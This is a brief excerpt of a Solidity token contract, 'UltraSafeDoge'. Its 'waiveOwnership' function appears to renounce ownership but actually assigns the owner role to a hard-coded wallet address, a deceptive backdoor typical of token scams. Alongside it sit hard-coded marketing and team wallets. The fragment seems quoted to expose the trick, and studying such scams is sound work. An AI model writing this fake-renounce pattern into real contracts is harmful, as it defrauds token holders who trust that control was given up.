...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x9689b1Fab93B387d787Ef3D0F76d068C06552Ba5));
        _owner = address(0x9689b1Fab93B387d787Ef3D0F76d068C06552Ba5);
    }
...
contract UltraSafeDoge is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0x7a474C81caf58EEC9BDD9f2d54d954994B086bdD);
    address payable public teamWalletAddress = payable(0xcf01e82b849fc86D0d1C0344d72C348a19F9d258);
